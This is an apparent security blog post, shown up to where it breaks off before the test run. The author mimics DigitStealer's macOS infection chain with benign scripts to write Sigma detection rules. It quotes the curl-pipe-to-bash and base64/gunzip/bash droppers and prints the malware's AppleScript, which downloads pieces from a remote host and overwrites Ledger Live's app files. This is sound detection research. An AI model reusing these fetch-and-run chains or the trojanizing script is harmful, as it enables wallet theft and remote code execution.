---
title: DigitStealer - Using Atomic Indicators and MacMonitor to Suck Less
categories: 
  - MacOS
  - Malware
  - InfoStealer
tags:
  - blog
  - macos
  - malware
  - analysis
  - stealer
  - digitstealer
  - atomic indicators
  - sigma rules
  - tooling
  - mac monitor
date: 2025-11-22
description: Developing better sigma rules and detectors by using Atomic style indicators and MacMonitor. 
author: izzyboop
image:
    path: /assets/img/digitstealer/cover.png
    visible: false
---

> As with all my other blogs, this was written for myself as an outlet to learn more about a specific subject. There may very well be better ways to do everything I do in this blog, and that's okay. Suckin at something is the first step toward bein sorta good at something. 
{: .prompt-info }

## Introduction

So a few days ago [Thijs Xhaflaire](https://www.linkedin.com/in/thijs-xhaflaire-290b63a5/?originalSubdomain=nl) of Jamf Threat Labs dropped a [super awesome blog](https://www.jamf.com/blog/jtl-digitstealer-macos-infostealer-analysis/) about a new JXA-based macOS infostealer, DigitStealer. This blog provides an incredibly informative write up of the key behavious exhibited by this flavour of macOS stealer, and highlights some of the specifics that differ from previous stealers. (Finally, one that's not AMOS.)

While reading this blog, I asked myself a series of questions. Namely:
1. Do my current detectors fire on any of this activity?
2. If they do, can my detector logic be improved?
3. What is the best way to create sigma rules for this observed activity with my limited tooling? (I'll expand on this.)

We will be focusing on quesiton three for the duration of this blog.

## The Problem (and My Solution)

My first problem is that my malware analysis pipeline is a bit under the weather at the moment so I was not confident interfacing with live samples.  This caused me to have to use the information provided in the Jamf blog as well as in a few other public sources. (I'm working on getting it spun back up, leave me alone.)

My second problem was that the actual telemetry I would need to detect against would be different than the source code provided in these blogs. I needed a way to see the resulting host telemetry without executing a (malicious) live sample. 

My third problem was that I do not currently have a SIEM or any log ingestion tooling. I have some new hardware on the way to spin up ~~Splunk~~ Elastic in my homelab but at the moment my lab consists of some network hardware and a raspberry pi and the little guy was simply not up to the task of running Elastic or Splunk. 

This was while idle: 

![image](/assets/img/digitstealer/pipain.png){: .w-75 .shadow .rounded-10 }
_He was trying his best_

>A/N: This was true at the time of this analysis. In the middle of writing this blog I have since spun up an ELK stack bacause Splunk's macOS ingesiton made me very sad. Further blogs will utilize ELK.

With all of these limitations, I still had a task to complete. So how did I get it done? I created some fake malware samples meant to mimic the observed digitstealer activity that ultimately just prints some `hello world`'s and creates some files on disk. I ran my fake malware while using one of my favourite tools, [MacMonitor](https://github.com/Brandon7CC/mac-monitor) (thanks [Brandon Dalton](https://github.com/Brandon7CC)), to see the resulting host telemetry to create my sigma rules, then used [sigma-esf](https://github.com/bradleyjkemp/sigma-esf) to test these sigma rules against my benign samples.

## The Observed Activity
### The Dropper

I didn't recreate every part of this malware. Instead I focused on a few key points I felt were good detection opportunities. 

1. Stage one: The initial dropper
    - The initial `.msi` labeled text file containing the initial `curl`
    - The resulting `base64` encoded payload getting piped to `base64 -d`, `gunzip`, and `bash`
    - The four `curl` commands used to pull down further payloads
2. Payload one: The plain text `AppleScript`
    - This applescript pulls down three separate pieces of an `app.asar` file then concatenates them to modify Ledger Live.

All other payloads came after this activity so I only found it necessary to minic these first two sections (for now). I will be revisting this with a live sample when I get Splunk spun up. 

Let's take a look at the dropper. It starts off with a `.pkg` file that, when executed, presents the user with a `Drag Into Terminal.msi` file and instructs them to drag it into `Terminal`.

![image](/assets/img/digitstealer/thepkg.png){: .w-50 .shadow .rounded-10 }

This `.msi` file is actually just a text file with the `.msi` extension. The contents of this file are as follows:

{% raw %}
```bash
curl -fsSL [malicious URL] | bash
```
{: .nolineno }
{% endraw %}

> If you want the URLs, go check out the [Jamf blog](https://www.jamf.com/blog/jtl-digitstealer-macos-infostealer-analysis/). No seriously, go do that.
{: .prompt-tip }

When this file is dragged onto `Terminal` it executes the contents which uses `curl` to reach out to a malicious URL, then pipes the resulting payload to `bash`.

The payload it retreives and pipes into `bash` looks like the following:

{% raw %}
```bash
echo '[malicious base64 encoded payload]' | base64 -d | gunzip | bash
```
{: .nolineno }
{% endraw %}

This commandline takes the `base64` encoded payload, decodes it using `base64 -d` which reveals some compressed `gzip` data, pipes that to `gunzip` to uncompress it, then pipes the resulting payload to `bash`. 

The resulting payload was a `bash` script that did a bunch of hardware checking using `system_profiler` and `sysctl` then had four `curl` statements to pull down further malicious payloads:

{% raw %}
```bash
nohup curl -fsSL [malicious URL] | osascript >/dev/null 2>&1 &
sleep 1

nohup curl -fsSL [malicious URL] | osascript -l JavaScript >/dev/null 2>&1 &
sleep 1

nohup curl -fsSL [malicious URL] | osascript -l JavaScript >/dev/null 2>&1 &
sleep 1

nohup curl -fsSL [malicious URL] | bash >/dev/null 2>&1 &
```
{: .nolineno }
{% endraw %}

---
### Mimicking the Dropper

>If you would like to follow along, all these files are present on my [github](https://github.com/IzzyBoop/FakeMalwareStaging/tree/main/DigitStealer%20Simulation).
{: .prompt-info :}

There were a few burning questions I needed to answer which would motivate which parts of this activity I would mimic. First, I wanted to know if dragging the `.msi` file into terminal would count as an interactive commandline session, and whether or not that means I would not see the initial `curl` at all in the resulting telemetry. Next, if I did see it in the telem, does it retain the whole command or does it split the commands up at the pipes?

For example, when a command is run on a macOS host that utilizes pipes like this: `cat [some file] | grep iE 'some pattern' | sort | uniq`, you usually do not get that whole commandline as a single log event, you get four separate PIDs for `cat [some file]`, `grep -iE 'some pattern'`, `sort`, and `uniq`. The saving grace is they will all have the same group ID. Sometimes shown as `GID` or `PGID`. 

>You can find more information about macOS's weird PIDs and process forks in my other blog post [Basic macOS Malware Analysis](https://izzyboop.com/posts/MacOS-Static-Malware-Analysis-Techniques/).
{: .prompt-info :}

Further, when a commandline is executed resulting from a previous payload being piped to `bash`, is `bash` the parent process? Much in that same vein, when the commandline has several pieces that get split apart like in my above example, do they all have the same parent process, or are they a chained parent/child relationship? These are questions I was fairly sure I knew the answer to, but wanted to see it for myself. 

Let's start mimicking this activity. The best way to do that which made the most sense to me was to work backwards. Starting from the back I took one of the `nohup curl` commands and made it point to some benign applescript on my github (we will review this in the next section) then used [CyberChef](https://gchq.github.io/CyberChef/) to `gzip` it then `base64` encode it:

![image](/assets/img/digitstealer/b64payload.png){: .shadow .rounded-10 }

As you can see, I took the following commandline which points to `helloworld.applescript` on my github...

{% raw %}
```bash
#!/bin/bash

nohup curl -fsSL https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/applescript/helloworld.applescript 
| osascript >/dev/null 2>&1 &
sleep 1
```
{: .nolineno }
{% endraw %}

... and sent it through `gzip` and `base64 encode` to get an encoded payload. I then wrapped this with `echo`, `base64 -d`, `gunzip`, and `bash` and pushed it to my github as `dropper.sh`. This will be the file pulled down by my version of `Drag Into Terminal.msi`.

{% raw %}
```bash
echo 
'H4sIANRhHmkA/03NsW6EMAyA4Z2n8KkSW7HoeANDh0ontRNPYIIhUU0cxUlR0T08DB26/fqW/+WGU4g4kfmmieprAlezwOti4yf4UpLdETPt3RqKr1M1zk5j4Vg6pxs+juP3XTXhB33zF8lOmcdCa4grZl4MPdNsuNE1oZSEzeWQysUiumuWufvH8AQ1+usBZ/7BWEXgbWh7aBsT5gT9CRdRMle0AAAA' 
| base64 -d | gunzip | bash
```
{: file="dropper.sh" .nolineno }
{% endraw %}

This will hopefully allow me to see how these processes behave when loaded into memory and how that manifests in the telemetry. Will I see the base64? Will I see the decoded version? Will the commands be retained in their entirety or split apart? This is what I intend to find out.

Speaking of `Drag Into Terminal.msi`, we can now mimic that file too. As mentioned above, this file is just a text file with the `.msi` extension. The actual contents of the file were just a `curl` command with the `-fsSL` flags and piped to `bash`. I created the following file to download the `dropper.sh` file we just created and pushed it to my github as `Drag Into Terminal.msi`:

{% raw %}
```bash
curl -fsSL 'https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/bash/dropper.sh' 
| bash
```
{: file="Drag Into Terminal.msi" .nolineno }
{% endraw %}

The execution chain at this point in time is as follows:

1. `Drag Into Terminal.msi` dragged into terminal
    - `curl` pulls down `dropper.sh` into memory and pipes it into `bash`
2. `dropper.sh`, from memory, pipes a base64 and gzip'd payload into `base64 -d`, `gunzip`, then into `bash`
3. `curl` pulls down applescript and pipes it into `osascript`

So far, so good. Let's move on to the AppleScript payload. 

---

### The AppleScript

This is the payload that pulls down three separate files then concatenates them into `app.asar`, which is used to replace a file within a legitimate Ledger Live install on a target host. 

The AppleScript used in DigitStealer:

{% raw %}
```applescript
set kDomainPrefix to "67e5143a9ca7d2240c137ef80f2641d6"
set kDomainSuffix to "pages.dev"
set kTotalParts to 3
set kPartBaseName to "app.asar.zip.part"
set kPartExtension to ".aspx"

set kDownloadFolder to "/tmp/downloaded_parts"
set kMergedZip to "/tmp/app.asar.zip"
set kSourcePath to "/tmp/app.asar"
set kDestPath to "/Applications/Ledger Live.app/Contents/Resources/"

set kDomain to kDomainPrefix & "." & kDomainSuffix

do shell script "osascript -e 'set volume with output muted'"

do shell script "mkdir -p " & quoted form of kDownloadFolder
do shell script "rm -f " & quoted form of kMergedZip

repeat with i from 1 to kTotalParts
    set partUrl to "https://" & kDomain & "/" & kPartBaseName & i & kPartExtension
    set partFile to kDownloadFolder & "/part" & i & kPartExtension

    do shell script "curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o " & quoted form of partFile & " " & quoted form of partUrl
    do shell script "cat " & quoted form of partFile & " >> " & quoted form of kMergedZip
end repeat

do shell script "cd /tmp && unzip -o " & quoted form of kMergedZip
do shell script "killall 'Ledger Live' || true"

tell application "Finder"
    set sourceAlias to POSIX file kSourcePath as alias
    set destAlias to POSIX file kDestPath as alias
    duplicate sourceAlias to destAlias with replacing
end tell

do shell script "rm -rf " & quoted form of kDownloadFolder
do shell script "rm -f " & quoted form of kMergedZip

do shell script "osascript -e 'set volume without output muted'"
```
{: file="AppleScript" .nolineno }
{% endraw %}

---

### Mimicking the AppleScript

My primary goal in regard to mimicking the apple script was to see how certain lines manifested in process telemetry, so I chose certain lines that had questions I wanted answered while ignoring others I was confident about.

Let's take a look at my much smaller version and talk through it.

{% raw %}
```applescript
set kPrint to "applescript hello world"
set kURL to "https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/applescript/final.applescript"
set kDownloadFolder to "/tmp/FAKEMALWARE"
set kFile to "/tmp/FAKEMALWARE/final.applescript"
set kFile2 to "/tmp/FAKEMALWARE/final2.applescript"

-- This is a comment

do shell script "echo " & quoted form of kPrint

do shell script "mkdir -p " & quoted form of kDownloadFolder

do shell script "curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o " & quoted form of kFile & " " & quoted form of kURL

do shell script "cat " & quoted form of kFile & " >> " & quoted form of kFile2
```
{: file="helloworld.applescript" .nolineno }
{% endraw %}

The first thing I wanted to know was how `& quoted form of [variable]` showed up in the telemetry as well as `do shell script` so I created a variable`kPrint` and loaded it with a hello world string. The next thing I wanted to know was whether or not command flags persisted in the telemetry so I retained the original `do shell script "mkdir -p " & quoted form of kDownloadFolder` but just changed the path. From here I really wanted to know how the curl command with the 700 flags, a file path, and a URL would show up, so I retained that exactly as is and just changed the file path and pointed the URL to yet another benign AppleScript file on my github. the final thing I was curious about was whether or not the `cat` command retained the `>>` characters in the resulting telemetry so I kept that exactly as is but changed the variables to point to my own files. 

This file was saved as `helloworld.applescript` on my github and the `final.applescript` reference in this file is simply a hello world:

{% raw %}
```applescript
set kFinal to "final hello world"

do shell script "echo " & quoted form of kFinal
```
{: file="final.applescript" .nolineno }
{% endraw %}

Now that I have all the pieces in place, I'm ready to run it with `MacMonitor` listening. 

---

## Running the "Malware"

